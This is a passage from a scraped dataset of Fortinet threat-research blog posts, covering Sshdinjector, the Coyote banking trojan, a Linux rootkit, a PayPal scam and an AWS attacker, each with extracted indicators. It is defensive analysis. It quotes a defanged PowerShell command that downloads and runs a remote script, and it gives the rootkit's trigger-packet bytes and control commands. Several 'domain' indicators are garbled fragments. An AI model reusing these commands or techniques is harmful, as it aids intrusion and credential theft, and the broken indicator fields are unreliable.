far-fetched. While itcreatesa string containing the host's MAC address and exfiltrates it, there is no modification of the MAC address. In a related example, the AI claims the malware hides its network communications. It does not. It hides on the OS by infecting common binaries such as netstat, but it does not attempt to hide the communication itself. Yet another issue isomissions. Omissions are the downside of AI’s power to summarize situations. Its summaries often lack the details a human would find important. For example, at some point, the malware tests access to a file named/tmp/fcontr.xml. Despite this being absolutely clear in the assembly,the first version of AI-generated code completely eluded this part. The solution to this issue is toask again by modifying the question/prompt for the AI. In this case, I simply added to the end of the prompt: “Please pay attention to what is around fcontr.xml” and it solved the problem. Of course, this requires knowing that something had been omitted in the first place. In fact,interactions with AI are seldom perfect in a single shot. Rather, they could be compared to a discussion with a capable colleague with impressive knowledge and intelligence but less intuition and experience. For this research, I kept my disassembler open. I used it several times to check for hallucinations, assist the AI (!) when it failed to find correct addresses or cross-references, or guide it to look into interesting parts. While disassemblers and decompilers have improved over the last decade, this cannot be compared to the level of innovation we are seeing with AI. This isoutstanding! AI is particularly good at providing overviews of samples and generating easy-to-understand source code. Fortunately—or not?—AI cannot workalone and must be piloted and complemented by competent human analysis to spot hallucinations(the most dangerous issues),refine questions, identify omissions, or guidethe AI in the most interesting direction. I haven’t discussedlanguage models yet. Obviously, r2ai’s results depend on the language model used. Language models are configurable, and we can conveniently switch from one to another, whether a local model or a remote one, free access or paid. The results from this article were mainly obtained using Claude 3.5 Sonnet 2024-10-22. Last but not least, this blog post was written without AI assistance ;-) Fortinet customers are already protected from this malware variant through our AntiVirus as follows: FortiGuard Labs detects the sample with the following AV signatures: ELF/Sshdinjector. A!tr and Linux/Agent. ACQ!tr TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. 94e8540ea39893b6be910cfee0331766e4a199684b0360e367741facca74191f 0e2ed47c0a1ba3e1f07711fb90ac8d79cb3af43e82aa4151e5c7d210c96baebb 6d08ba82bb61b0910a06a71a61b38e720d88f556c527b8463a11c1b68287ce84 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/analyzing-elf-sshdinjector-with-a-human-and-artificial-analyst",
      "scraped_at": "2025-07-20T13:43:54.052983",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ithlibsshd",
          "nlibsshd",
          "contr"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "6d08ba82bb61b0910a06a71a61b38e720d88f556c527b8463a11c1b68287ce84",
          "0e2ed47c0a1ba3e1f07711fb90ac8d79cb3af43e82aa4151e5c7d210c96baebb",
          "94e8540ea39893b6be910cfee0331766e4a199684b0360e367741facca74191f"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.21475256769374418
    }
  },
  {
    "id": "Fortinet_14599",
    "source": "Fortinet",
    "title": "Coyote Banking Trojan: A Stealthy Attack via LNK Files",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Controls victim’s device and collects sensitive informationSeverity Level:High Over the past month, FortiGuard Labs has identified several similar LNK files containing PowerShell commands designed to execute malicious scripts and connect to remote servers. These files are part of multi-stage operations that ultimately deliver the Coyote Banking Trojan. This malware primarily targets users in Brazil, seeking to harvest sensitive information from over 70 financial applications and numerous websites. Once deployed, the Coyote Banking Trojan can carry out various malicious activities, including keylogging, capturing screenshots, and displaying phishing overlays to steal sensitive credentials. In this article, we will detail the behavior of each stage. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The LNK file executes the following PowerShell command, which connects to a remote server to initiate the next stage: -w hid -noni -ep Bypass -c “Start-Job -Name PSSGR -ScriptBlock { IEX (iwr -Uri ‘hxxps://tbet[.]geontrigame[.]com/zxchzzmism’ -UseBasicParsing). Content }; Start-Sleep 131.” We analyzed multiple malicious files by examining the “Machine ID” embedded within the LNK files. This unique identifier provides critical insights into the system where the LNK file originated. By extracting and analyzing this metadata, we traced connections to other malicious LNK files associated with Coyote. URLs in Arguments MAC Address hxxps://tbet.geontrigame[.]com/zxchzzmism 0cb44b707681 aa:1c:b2:83:1d:72 hxxps://hrod.geontrigame[.]com/edsfluzevj a8025a01fc56 f5:12:59:16:ba:f7 hxxps://easi.geontrigame[.]com/wydqfchssb a8025a01fc56 f5:12:59:16:ba:f7 hxxps://iivi.geontrigame[.]com/zkrghotqvy a8025a01fc56 f5:12:59:16:ba:f7 hxxps://cuzo.geontrigame[.]com/pxylqhpuiv a8025a01fc56 f5:12:59:16:ba:f7 hxxps://btee.geontrigame[.]com/mvkrouhawm dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://qmnw.daowsistem[.]com/fayikyeund dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://bhju.daowsistem[.]com/iwywybzqxk dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://lgfd.daowsistem[.]com/riqojhyvnr dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://leme.daowsistem[.]com/omzowcicwp dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://igow.scortma[.]com/fqieghffbm dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://quit.scortma[.]com/xzcpnnfhxi dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://llue.geontrigame[.]com/byyyfydxyf dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://cxmp.scortma[.]com/qfutdbtqqu dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://xrxw.scortma[.]com/gmdroacyvi dc0bfa46899d e8:a5:d6:6a:57:02 hxxps://qfab.geontrigame[.]com/vfofnzihsm dc0bfa46899d e8:a5:d6:6a:57:02 The content in “zxchzzmism” is an additional PowerShell script that holds two encoded data segments. This script employs specific commands to decode and execute the embedded shellcode, initiating the next phase of the malicious operation. The “bmwiMcDec” DLL file functions as a loader, utilizing VirtualAllocEx and WriteProcessMemory to inject the “npuGDec” payload. It then employs CreateRemoteThread to execute the injected malicious code, facilitating the continuation of the attack. The injected code leverages Donut, a tool designed to decrypt and execute the final MSIL (Microsoft Intermediate Language) payloads. This ensures seamless delivery and execution of the attack’s next stage. The decrypted MSIL execution file first establishes persistence by modifying the registry at “HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.” It checks for any existing PowerShell command in this registry entry. If found, it removes the existing entry and creates a new one with a randomly generated name. This new registry entry contains a customized PowerShell command pointing to download and execute a Base64-encoded URL, which facilitates the main functions of the Coyote Banking Trojan. The targeted URL for this operation is “hxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw.” If the victim is the new target, it gathers basic system information, such as the machine name, username, and operating system, and sends it to a remote server. It also identifies installed antivirus products by querying the SecurityCenter2 namespace in Windows Management Instrumentation (WMI). The collected data is then concatenated with a “|” separator, encoded in Base64, and the resulting string is reversed. This processed string is appended as a parameter and sent back to the remote server as follows: “hxxps://yezh[.]geontrigame[.]com/hqizjs/?l=y4CMuADfvJHUgATMgM3dvRmbpdFI0Z2bz9mcjlWT8JXZk5WZmVGRgM3dvRmbpdFfzlmcoNEf0IDR0Ul(omit).” After setting and checking in, it calls “CreateProcess” to execute the PowerShell command that was added into the registry to invoke the payload: The payload “vxewhcacbfqnsw” is similar to the one downloaded from the LNK file but is noticeably larger. This increase in size is due to the inclusion of the main Coyote Baking Trojan. We obtained the MSIL file after decrypting the payload from the Donut shellcode. It contained the following functions: Description Disconnect from server Terminate program Take screenshot as image/jpeg Get a window's title bar text Activate a window and restore it to its original size Minimize a window Activate a window and restore it to its normal size then display it as a maximized window Kill targeted process Show full-screen overlay Restore a window and then maximize it Remove the window handle Shut down the device Enable the Desktop Window Manager composition feature then shut down the device Click mouse at a specific screen position Copy a string to the clipboard and then simulate typing that string Send the specified keys to the active application. If a key contains a ‘+,’ it is sent as an uppercase character; otherwise, it is sent as a lowercase character. Disable DWM composition Display the fake image for a specific target with a message. For example: “Trabalhando nas atualiza” (Working on updates), “Aponte a câmera para a imagem a seguir” (Point the camera at the following image) Cleanup, unhook, and stop current monitoring Control user-visible windows, close the window Adjust the opacity Enable keylogger or send the keylogger’s result with separator ‘¾’ Simulate key presses to perform automated navigation actions: {UP}, {RIGHT}, {DOWN}, and {LEFT} Manipulate display settings Send the given keys Coyote's infection process is complex and multi-staged. This attack leveraged an LNK file for initial access, which subsequently led to the discovery of other malicious files. This Trojan poses a significant threat to financial cybersecurity, particularly because it has the potential to expand beyond its initial targets. Consequently, it highlights the critical need for robust security measures for both individuals and institutions to safeguard against evolving cyber threats. The malware described in this report is detected and blocked byFortiGuard Antivirusas: LNK/Agent. D!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web FilteringService blocks the C2 server. We also suggest that organizations go through Fortinet’s free cybersecurity training module:Fortinet Certified Fundamentals (FCF)in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps://btee[.]geontrigame[.]com/mvkrouhawmjxxps://qmnw[.]daowsistem[.]com/fayikyeundhxxps://bhju[.]daowsistem[.]com/iwywybzqxkhxxps://lgfd[.]daowsistem[.]com/riqojhyvnrhxxps://leme[.]daowsistem[.]com/omzowcicwphxxps://igow[.]scortma[.]com/fqieghffbmhxxps://quit[.]scortma[.]com/xzcpnnfhxihxxps://llue[.]geontrigame[.]com/byyyfydxyfhxxps://cxmp[.]scortma[.]com/qfutdbtqquhxxps://xrxw[.]scortma[.]com/gmdroacyvihxxps://qfab[.]geontrigame[.]com/vfofnzihsmhxxps://tbet[.]geontrigame[.]com/zxchzzmismhxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw geraatualiza[.]commasterdow[.]comgeraupdate[.]com 362af8118f437f9139556c59437544ae1489376dc4118027c24c8d5ce4d84e48330dffe834ebbe4042747bbe00b4575629ba8f2507bccf746763cacf63d655bb33cba89eeeaf139a798b7fa07ff6919dd0c4c6cf4106b659e4e56f15b5809287552d53f473096c55a3937c8512a06863133a97c3478ad6b1535e1976d1e0d45f64209e2348e6d503ee518459d0487d636639fa5e5298d28093a5ad41390ef6b067f371a683b2be4c8002f89492cd29d96dceabdbfd36641a27be761ee64605b173ad6be67691b65cee251d098f2541eef3cab2853ad509dac72d8eff5bd85bc07cbfbce482071c6df823f09d83c6868d0b1208e8ceb70147b64c52bb8b48bdb8839de445f714a32f36670b590eba7fc68b1115b885ac8d689d7b344189521012bea4f753707eba4088e8a51818d9de8e9ad0138495338402f05c5c7a800695a6f3c37b1de5983b30b9ae70c525f97727a56d3874533db1a6e3dc1355bfbf37ecfd0ef425d34b56d0bc08bd93e6ecb11541bd834b9d4d417187373b17055c862e Cara Lin,trojan FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/coyote-banking-trojan-a-stealthy-attack-via-lnk-files",
      "scraped_at": "2025-07-20T13:44:02.497764",
      "indicators": {
        "ip_address": [],
        "domain": [
          "hju",
          "ivi",
          "rod",
          "uzo",
          "rxw",
          "xmp",
          "fab",
          "asi",
          "bet",
          "eme",
          "gow",
          "mnw",
          "tee",
          "gfd",
          "uit",
          "lue"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.4827586206896552
    }
  },
  {
    "id": "Fortinet_90560",
    "source": "Fortinet",
    "title": "Deep Dive Into a Linux Rootkit Malware",
    "text": "FortiGuard Labs Threat Research Affected platforms:CentOS LinuxImpacted parties:CentOS UsersImpact:Full remote control of a victim’s deviceSeverity level:Critical This is a follow-up analysis to a previous blog about azero day exploitwhere the FortiGuard Incident Response (FGIR) team examined how remote attackers exploited multiple vulnerabilities in an appliance to gain control of a customer’s system. At the end of that blog, we revealed that the remote attacker had deployed a rootkit (a loadable kernel module, sysinitd.ko) and a user-space binary file (sysinitd) on the affected system by executing a shell script (Install.sh). Additionally, to establish rootkit persistence, entries for the rootkit malware were added in the /etc/rc.local and /etc/rc.d/rc.local files so the rootkit malware is loaded during system startup. During our analysis of the image of the compromised device, we found that its Linux audit logs contained user-space shell commands executed by the Threat Actor on the appliance. The executed shell commands were stored as hexadecimal blobs in the audit logs. One of the log entries found was as follows: 2024-09-07 03:26:18 When decoded, the hexadecimal resulted in a base64-encoded blob. Decoding the base64 blob produced a tgz file, which, upon decompression, produced the following two files. Analysis ofinstall.sh, which is an injector script, reveals that as a default, it installs a shareable object,sysinitd.so, in the location/usr/share/empty/. Pivoting from this, the FGIR team analyzed the image of the compromised Ivanti box and retrieved two malicious files created by the Threat Actor on the disk in the location/usr/share/empty/. One of the two files was the rootkit—the malicious kernel modulesysinitd.so, which is referred to as sysinitd.ko in this analysis. FortiGuard conducted an in-depth analysis of the malicious rootkit malware. This analysis reveals how the kernel module hijacks the inbound network traffic to the compromised Ivanti system, how the user-space malicious file is started, and how it communicates with the rootkit module. The analysis also sheds light on the overall purpose of the rootkit malware. The command “readelf –h sysinitd.ko” displays the kernel module's ELF (Executable and Linkable Format) file header information, as shown in Figure 1. Its ELF type is “REL (Relocatable file),” which is the expected type for the kernel modules. The kernel module is loaded and starts functioning after executing the command “insmod /usr/share/empty/init/sysinitd.ko,” as shown in Figure 2. When the kernel module is inserted into the kernel, its init_module() function is called. It performs some initialization tasks, such as setting values to some global variables, decrypting strings, registering a network hook function, creating file descriptors under the “/proc” folder, and more. Figure 3 illustrates how it decrypts the encrypted string by calling a function. In this example, the string “abrtinfo” has just been decrypted. It will be used later when creating procfs (process filesystem) entries. Next, the kernel module calls the kernel API, nf_register_hook(), to register a Netfilter hook. Figure 4 shows the contextual ASM instructions for calling nf_register_hook(). The API only takes the structure “nf_hook_ops” as its argument, which specifies a hook function, hook number, priority, and protocol family. The hook callback function is “network_hook_func_15()”(in Figure 4). The protocol family for the IPv4 protocol is 2. The hook number is 0 for NF_INET_PRE_ROUTING, a hook point in the Linux kernel's Netfilter framework where incoming packets are intercepted before any routing decision is made. This is typically the first point where packets are intercepted after they arrive in the system. One of the two files was the rootkit, which lists all the available values for the hook number option and their descriptions: Description NF_INET_PRE_ROUTING Packet received, before routing decision. NF_INET_LOCAL_IN Packet destined for the local machine, after routing. NF_INET_FORWARD Packet being forwarded to another machine. NF_INET_LOCAL_OUT Packet originating from the local machine, before routing. NF_INET_POST_ROUTING Packet after routing, ready for transmission. Afterward, the init_module() function of the kernel module (sysinitd.ko) creates three procfs entries in the folder “/proc/” using the kernel API proc_create_data(). The names of the procfs entries are taken from the string “abrtinfo” decrypted earlier. The following ASM instruction snippet demonstrates the creation of the three procfs entries. .text:023D6xorr8d, r8d .text:023D9movrcx, offset as_STDIN_FD .text:023E0xoredx, edx .text:023E2movesi, 1B6h; \"RW-RW-RW-\" .text:023E7movrdi, offset byte_3275; \"abrtinfo\" .text:023EEcallproc_create_data .text:023F3xorr8d, r8d .text:023F6movrcx, offset as_STDOUT_FD .text:023FDxoredx, edx .text:023FFmovesi, 1B6h; \"RW-RW-RW-\" .text:02404movrdi, offset byte_3276; \"brtinfo\" .text:0240Bmovcs:gv_26, rax .text:02412callproc_create_data .text:02417xorr8d, r8d .text:0241Amovrcx, offset as_control_STDIN_FD .text:02421xoredx, edx .text:02423movesi, 1B6h; \"RW-RW-RW-\" .text:02428movrdi, offset byte_3277; \"rtinfo\" .text:0242Fmovcs:gv_261, rax .text:02436callproc_create_data All the procfs entries’ permissions are set as 1B6h, which stands for “rw-rw-rw-,” granting read/write access to all users. Their names are all derived from the string “abrtinfo” but at different offsets: “abrtinfo” at offset 0x3275, “brtinfo” at offset 0x3276 and “rtinfo” at offset 0x3277. Figure 5 shows the three created files. The Install.sh determines whether the kernel module has been successfully loaded by checking whether “/proc/abrtinfo” has been created. We have learned that the three procfs entries act as file descriptors when the user-space process (sysinitd) runs, where “/proc/abrtinfo” will be sysinitd’s stdin, “/proc/brtinfo” will be sysinitd’s stdout, and “/proc/rtinfo” will pass the control commands to sysinitd. In the kernel module, there are many callback functions bound to these procfs entries: Linux calls the Netfilter hook function once the incoming IPv4 packets, UDP and TCP, arrive. The malware focuses solely on the TCP packets (the protocol value is 6). It compares the protocol value of the received packet and ignores non-TCP packets. TCP sessions are established with a three-way handshake. As a result, the attacker must establish a TCP session with the services running on the compromised system, such as HTTP (port 80), HTTPS (443), SSH (22), FTP (21), and more. For the hook function to recognize the packet from the attacker, the attacker must send a special packet to the compromised system (referred to as the attack-init packet (the first packet) in this analysis). The attack-init packet must be 0xd bytes long and in the following format: Description “\\x31” or “\\x30”. A flag to enable or disable encryption for traffic. Verification data. “Dw1” Verification data. “Dw5” Verification data. “Dw9” To get the packet through, it must also meet the following conditions: 1> Dw1 == Dw9 ^ 0x32C21F0A2> Dw5 == Dw9 ^ 0xED22AF9E or Dw5 == Dw9 ^ 0x4B1EF486 An example of a crafted attack-init packet looks like this: “\\x30”+“\\x3E\\x2B\\xF6\\x06”+”\\xAA\\x9Bx16\\xD9”+”\\x34\\x34\\x34\\x34” Once the attack-init packet is verified, the kernel module records the source IP and Port and, in some global variables, the destination IP and Port. This ensures that subsequent traffic meeting the conditions will be recognized as coming from the attacker and only processed within the Netfilter hook function. Meanwhile, a series of kernel APIs are called, including queue_work_on(), kthread_create_on_node(), wake_up_process(), and call_usermodehelper(). Based on our analysis, these APIs start the user-space file (sysinitd). The call_usermodehelper() API is used in the Linux kernel to execute a user-space program from the kernel space. The function definition is: intcall_usermodehelper(constchar*path,char**argv,char**envp,intwait); According to the ASM instructions in Figure 6, it starts the user-space process with the command line argument “abrtinfo:0.” The path to the process, “/usr/share/empty/init/sysinitd,” is hardcoded in the kernel module. We explain how the user-space process works in the next section. All response packets from the kernel module have the same format, as shown in the table below: Description The size of the payload data. Payload data. The payload data is encrypted as long as the first byte in the attack-init packet is “\\x31.” The encryption key is calculated from the verification data in the attack-init packet, which is then returned to the attacker while the attack-init packet is being processed. Figure 7 shows a simulated attack scenario where the attacker (the client) sends an attack-init packet to the compromised system (the server). The rootkit malware verifies the packet, generates an encryption key (4 bytes) from the first packet and other related data, and sends it back to the attacker in a response packet. If the attack-init packet enables the encryption function, the encryption key will be used to encrypt and decrypt the payload data on both the client and server. Otherwise, both sides will discard the encryption key packet. From that point on, the attacker can communicate with the infected system. Incoming packets from the attacker are passed to the user-space process, which reads from “/proc/abrtinfo” via the read callback function. The kernel module also sends back the output of the user-space process when it writes data to “/proc/brtinfo.” Figure 8 shows a pseudo-code example of the read callback function assigned to “/proc/abrtinfo. \" This function calls a kernel API copy_to_user() to copy the attacker’s data to the user-space process (sysinitd). When the attacker sends 4-byte control commands to the compromised system, “/proc/rtinfo” is used to pass the commands to and control the user-space process. It passes 0xE1 to “/proc/rinfo”. It passes 0xE2 to “/proc/rinfo”. It passes 0xE4 to “/proc/rinfo”. The user-space file “sysinitd” was copied to “/usr/share/empty/init” in Install.sh. In reviewing its ELF header information in Figure 9, we find that the ELF type is EXEC, indicating that it is a user-space executable file. The sysinitd process is started by the kernel module. It disguises itself as a bash program by replacing its process name with “bash,” which is a decrypted string. Because of this, the system administrator is unlikely to identify it as malware. It then calls APIs to archive this, like the following C-code: memset(argv[0], 0, sizeof(argv[0])); strcpy(argv[0], “bash”); It then verifies whether its command-line argument is “abrtinfo” using the API strcmp(), as shown in Figure 10. If the command-line argument does not match, the process exits. Next, it invokes the Linux system call “fork()” to create a child process. From this point on, the parent and child processes follow different workflows. After fork() is initiated, it continues to set the current process’s standard input to “/proc/abrtinfo,” standard output, and standard error to “/proc/brtinfo” by invoking three dup2() system calls. Refer to Figure 11 for the corresponding ASM instructions that perform this action. These procfs entries are created in the kernel module. A callback function is assigned to each one, which is called when read or write operations occur. At the bottom of Figure 11, another system call, execv(), is invoked to replace the current process with a specified one, which in this case is “/bin/sh.” The attacker can now remotely execute any command with root privilege on the compromised system through the malicious kernel module (sysinitd.ko) and the child process (sysinitd -> /bin/sh). The parent process now begins performing tasks typically associated with a daemon process, such as managing the child process (e.g., starting, restarting, and killing the child process). It reads control commands from the file descriptor “/proc/rtinfo” and follows the different branches depending on the command values. As indicated in Figure 12, it reads the control command 0xE1. To archive this, the attacker must send this 4-byte packet\"\\x04\\xb4\\xfe\\xb3\". The supported control commands are listed in the following table: Restarts the child process. Kills the child process. Sends Ctrl+C to the child process. Kills both the child and parent process. Figure 13 is a screenshot of the output of the command “ps aux | grep –e “ sh” –e “bash,” where “sh” is the child process and “bash” is the parent process. Figure 14 illustrates how the attacker controls the compromised system via rootkit malware and the user-space process. We developed a Python script to simulate the attacker controlling the compromised Linux system. By leveraging the Python script to send numerous Linux commands to the compromised system, we can see the communication and command execution results, as shown in Figure 15, which is a Wireshark screenshot of the traffic data. The commands sent to the Linux system are “whoami,” “pwd,” “wget -O Fortinet.html -o summary www.fortinet.com,” and “ls -l fortinet.html.” In this analysis, we focused on the rootkit malware. We first explained how the kernel module set a Netfilter hook function on NF_INET_PRE_ROUTING to hijack the incoming TCP traffic to the compromised system. Next, we elaborated on what related tasks the Netfilter hook function performs, including how it handles the attacker-init packet and the response packet format, invokes the user-space file, and exchanges data between the user-space process and the kernel module. You also learned how the user-space process is started, how it disguises itself as “bash,” how it creates the child process using a fork() system call, and how it is eventually replaced by “/bin/sh” to process the attacker’s Linux commands to control the system. Finally, we demonstrated how an attacker establishes a connection to a compromised system, sends Linux commands, and retrieves the result through traffic sniffing. Fortinet customers are already protected from this campaign. The FortiGuard Antivirus service detects the malicious files install.sh, sysinitd.ko, and sysinitd as: BASH/Injector. CSA!trELF64/Injector. CSA!trELF64/Injector. CSA!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. [install.sh]8D016D02F8FBE25DCE76481A90DD0B48630CE9E74E8C31BA007CF133E48B8526 [sysinitd.ko]6EDD7B3123DE985846A805931CA8EE5F6F7ED7B160144AA0E066967BC7C0423A [sysinitd]D57A2CAC394A778E19CE9B926F2E0A71936510798F30D20F207F2A49B49CE7B1 Reference:Burning Zero Days: Suspected Nation-State Adversary Targets Ivanti CSA linux,malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/deep-dive-into-a-linux-rootkit-malware",
      "scraped_at": "2025-07-20T13:44:09.813188",
      "indicators": {
        "ip_address": [],
        "domain": [
          "c",
          "ww",
          "ortinet",
          "odulesysinitd",
          "nstall",
          "finstall",
          "ysinitd"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "D57A2CAC394A778E19CE9B926F2E0A71936510798F30D20F207F2A49B49CE7B1",
          "8D016D02F8FBE25DCE76481A90DD0B48630CE9E74E8C31BA007CF133E48B8526",
          "6EDD7B3123DE985846A805931CA8EE5F6F7ED7B160144AA0E066967BC7C0423A"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.3022101939557961
    }
  },
  {
    "id": "Fortinet_22487",
    "source": "Fortinet",
    "title": "Phish-free PayPal Phishing",
    "text": "FortiGuard Labs Threat Research As a CISO, I am always on high alert for phishing attempts, and this recent example immediately set off alarm bells. Most obviously, why am I even receiving this request? I don’t use my corporate email address in PayPal. Additionally, the To: address, “Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com,” is not mine. Usually, this would result in a ‘report and move on’ action from me, but I was a little intrigued. Whenever I see a phishing email, I always think, WWMMD (what would my Mum do?). How would I have responded based on all the methods I have told her to look for? Firstly, the sender address appears to be valid and not spoofed. …and the URL looks genuine. At this point, this seems to be a genuine email—at least, my mum might think so. So, what is going on? A genuine email can’t still be a problem, can it? Well, here is the catch in this instance. When you click on the link, you are redirected to a PayPal login page showing a request for payment. A panicked person may be tempted to log in with their account details, but this would be very dangerous. It links your PayPal account address with the address it was sent to—not where you received it. In this case, PayPal thinks it sent this request to Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com The scammer appears to have simply registered an MS365 test domain, which is free for three months, and then created a Distribution List (Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com) containing victim emails, as shown below: On the PayPal web portal, they simply request the money and add the distribution list as the address: This money request is then distributed to the targeted victims, and the Microsoft365 SRS (Sender Rewrite Scheme) rewrites the sender to, e.g., bounces+SRS=onDJv=S6[@]5ln7g7.onmicrosoft.com, which will pass the SPF/DKIM/DMARC check. Once the panicking victim logs in to see what is going on, the scammer’s account (Billingdepartments1[@]gkjyryfjy876.onmicrosoft.com) gets linked to the victim’s account. The scammer can then take control of the victim's PayPal account—a neat trick. It’s so neat, in fact, that it would sneak past even PayPal’s own phishing check instructions. The beauty of this attack is that it doesn’t use traditional phishing methods. The email, the URLs, and everything else are perfectly valid. Instead, the best solution is the Human Firewall—someone who has been trained to be aware and cautious of any unsolicited email, regardless of how genuine it may look. This, of course, highlights the need to ensure your workforce is receiving the training they need to spot threats like this to keep themselves—and your organization—safe. This is a perfectly valid email in most ways. However, it is still possible to create a DLP rule to look for multiple conditions that indicate that this email is being sent via a distribution list. The following rule will successfully identify such a case. Industry Trends FortiGuard Labs Threat Research Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/phish-free-paypal-phishing",
      "scraped_at": "2025-07-20T13:44:17.935644",
      "indicators": {
        "ip_address": [],
        "domain": [
          "kjyryfjy876",
          "ln7g7"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.18404907975460125
    }
  },
  {
    "id": "Fortinet_98659",
    "source": "Fortinet",
    "title": "Catching \"EC2 Grouper\"- no indicators required!",
    "text": "FortiGuard Labs Threat Research Through the years of analyzing identity compromises in the cloud, we’ve seen the same attackers pop up regularly, some more frequently than others. Among the more prolific ones we’ve come to know is one we’ve dubbed “EC2 Grouper”. Over the past couple of years, we’ve seen this actor in several dozen customer environments, making them one of the more active groups we’ve tracked. This usual suspect is attributed by their penchant for using similar user agents and the same security group naming convention in their attacks. Whileindicatorssuch as user agents and even security group names can assist in attribution and hunting, we have found them unreliable for comprehensive threat detection. In this blog, we’ll detail tactics associated with EC2 Grouper and howLacework FortiCNAPPcan be leveraged to detect this threat, among others. More importantly, we will showcase how this is achieved without relying on actor-specific indicators, which can be transient in nature. EC2 Grouper is characterized by their usage of AWS tools for PowerShell to carry out attacks. This is presumed by their user agent, which was consistent for a number of years: AWSPowerShell. Common/4.1.90.0 . NET_Core/6.0.5 OS/Microsoft_Windows_10.0.17763 PowerShellCore/7.-1 ClientAsync In recent attacks, they have updated their UA, which now contains new versioning and unusual # characters, which could indicate a possible detection countermeasure. AWSPowerShell. Common/4.1.534.0 ua/2.0 . NET_Core#6.0.5 OS/windows#10.0.17763.0 md/ARCH#X64 PowerShellCore/7.-1 cfg/retry-mode#legacy md/ClientAsync A more consistent indicator has emerged with a security group naming convention. Attacks in the cloud often leverage the CreateSecurityGroup API (T1098) to enable remote access and lateral movement in the cloud environment. EC2 Grouper will typically attempt to create multiple groups using the same naming convention of ec2group suffixed with a sequential combination of 1-5. Example request parameters: {\"groupDescription\":\"ec2group\",\"groupName\":\"ec2group\"} {\"groupDescription\":\"ec2group1\",\"groupName\":\"ec2group1\"} {\"groupDescription\":\"ec2group12\",\"groupName\":\"ec2group12\"} {\"groupDescription\":\"ec2group123\",\"groupName\":\"ec2group123\"} {\"groupDescription\":\"ec2group1234\",\"groupName\":\"ec2group1234\"} {\"groupDescription\":\"ec2group12345\",\"groupName\":\"ec2group12345\"} In all instances of EC2 Grouper attacks, cloud activity appears to be largely automated. The attacker will initially make calls to DescribeInstanceTypes to inventory EC2 types within the environment and then DescribeRegions to retrieve information about regions available for resources. Upon acquiring available regions, the following API calls are iteratively executed for every available region: Interestingly, we have never observed calls to AuthorizeSecurityGroupIngress, which is ultimately required to configure inbound access to any EC2 launched with the security group. However, on several occasions, we have observed CreateInternetGateway and CreateVpc, which are required for remote access. To date, we have not observed what could be classified as actions based on objectives or manual activity in a compromised cloud environment. It could be either that EC2 Grouper is selective in their escalation or compromised accounts were detected and quarantined before they had the opportunity to escalate. Despite this, resource hijacking (T1496) is likely the general objective. However, to what end is currently unconfirmed. In every attack involving valid accounts, the credentials must originate from somewhere. One of the more common sources for compromised keys remains code repositories. Developers often mistakenly commit cloud access keys to public repositories. Once this occurs, the clock starts ticking until the credentials fall into the hands of attackers, are discovered by secret scanners, or both. This is believed to be the primary method of credential acquisition for EC2 Grouper, as their cloud attacks are frequently accompanied by attacks from other threat actors. EC2 Grouper, however, is by far the most prolific actor allegedly using this vector. Given the popularity of obtaining credentials in code repositories, it can be prudent to look for legitimate secret scanning services as part of your detection strategy. These include GitGuardian and Github’s secret scanning service. In our composite alerts, we have included secret scanning as a signal, as it is frequently seen in conjunction with illicit credential usage. Of course, credential checking alone does not indicate a compromise, so other signals need to be correlated to reduce false positives. When alerting on EC2 Grouper, our composite alerts have evaluated other techniques, such as using specific APIs known to be leveraged in attacks. These are effectively mapped to the respective techniques with the 